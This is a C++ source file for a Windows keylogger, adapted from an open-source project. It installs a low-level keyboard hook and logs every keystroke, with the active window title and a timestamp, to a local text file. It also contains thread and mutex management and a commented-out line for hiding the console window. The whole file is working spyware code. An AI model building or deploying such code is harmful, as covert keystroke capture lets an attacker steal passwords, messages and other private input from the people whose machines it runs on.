// MIT Licensed code modified from: 
// https://github.com/GiacomoLaw/Keylogger/blob/master/windows/klog_main.cpp

#include "stdafx.h"

#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>
#include "keylogger.h"

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

// Mutex to prevent multiple keyloggers running concurrently
HANDLE ghMutex;

// Keylogger thread that tracks user keys
HANDLE ghThreadKeylogger;

// Setting to true will kill the keylogger
BOOL gbStopKeylogger;

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	const char *fname = "C:\\Users\\Group10\\Documents\\Keylog.txt";

	if (nCode >= 0)
	{
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN)
		{
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			// save to file
			Save(kbdStruct.vkCode, _strdup(fname));
		}
	}

	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		MessageBoxA(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke, char *file)
{
	errno_t err;
	char lastwindow[256];

	if ((key_stroke == 1) || (key_stroke == 2))
		return 0; // ignore mouse clicks


	FILE *OUTPUT_FILE;
	err = fopen_s(&OUTPUT_FILE, file, "a+");

	HWND foreground = GetForegroundWindow();
	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, window_title, 256);

		if (strcmp(window_title, lastwindow) != 0) {
			err = strcpy_s(lastwindow, window_title);

			// get time
			time_t t = time(NULL);
			struct tm tm;
			err = localtime_s(&tm, &t);

			char s[64];
			strftime(s, sizeof(s), "%c", &tm);

			fprintf(OUTPUT_FILE, "\n[Window: %s - at %s] ", window_title, s);
		}
	}

	// Debug line to print key strokes
	//std::cout << key_stroke << '\n';

	if (key_stroke == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	else if (key_stroke == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (key_stroke == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else if (key_stroke == 189 || key_stroke == 109)
		fprintf(OUTPUT_FILE, "%s", "-");
	else if (key_stroke == 20)
		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
	else {
		if (key_stroke >= 96 && key_stroke <= 105)
		{
			key_stroke -= 48;
		}
		else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
														 // check caps lock
			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

			// check shift key
			if ((GetKeyState(VK_SHIFT) & 0x1000) != 0x1000 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0x1000) {
				lowercase = !lowercase;
			}

			if (lowercase) key_stroke += 32;
		}
		fprintf(OUTPUT_FILE, "%c", key_stroke);
	}
	// NOTE: Numpad-Keys seem to print as lowercase letters

	fclose(OUTPUT_FILE);
	return 0;
}

void StartKeylogger() {
	// Create mutex to prevent concurrent keyloggers
	ghMutex = CreateMutex(
		NULL,						// Default security attributes
		FALSE,						// Initially unowned
		_T("Global\\KEYLOGGER")		// Name to be referenced by other keylog processes
	);

	if (ghMutex == NULL) {
		// Mutex is already owned, die
		return;
	}

	// Launch the keylogger main process in another thread
	HANDLE hThreadKeylogger = CreateThread(
		NULL,
		0,
		LaunchKeylogger,
		NULL,
		0,
		NULL
	);

	gbStopKeylogger = FALSE;
}

void StopKeylogger() {
	// Release the mutex handle
	CloseHandle(ghMutex);

	// Notify the keylogger to stop
	gbStopKeylogger = TRUE;

	// Wait 2 seconds for the thread to stop
	WaitForSingleObject(ghThreadKeylogger, 2 * 1000);

}

DWORD WINAPI LaunchKeylogger(LPVOID lpParam) {
	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window

	// Grab the mutex
	// If the mutex is owned, wait for the previous keylogger to die before we take over
	WaitForSingleObject(
		ghMutex,
		INFINITE
	);

	// Set the hook
	SetHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) && !gbStopKeylogger){}

	// Release the mutex so other keyloggers can operate
	ReleaseMutex(ghMutex);

	return 0;
}